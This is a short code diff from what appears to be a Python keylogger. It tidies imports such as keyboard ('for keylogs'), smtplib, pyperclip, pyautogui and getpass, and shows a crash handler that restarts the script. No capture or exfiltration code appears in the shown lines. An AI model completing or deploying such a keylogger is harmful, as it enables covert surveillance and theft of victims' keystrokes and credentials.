@@ -1,8 +1,8 @@
 import os
-from pickle import FALSE
-from platform import platform
+# from pickle import FALSE
+# from platform import platform
 import time
-from click import File
+# from click import File
 import keyboard # for keylogs
 import smtplib
 from email.mime.image import MIMEImage
@@ -13,7 +13,7 @@ from email.header import Header
 from threading import Timer
 from datetime import datetime
 import getpass
-from pip import main
+# from pip import main
 import pyperclip
 import pyautogui
 import ctypes
@@ -30,7 +30,7 @@ def start_script():
         handle_crash()
 
 def handle_crash():
-    time.sleep(5)  # Restarts the script after 2 seconds
+    time.sleep(5) 
     start_script()
 
     
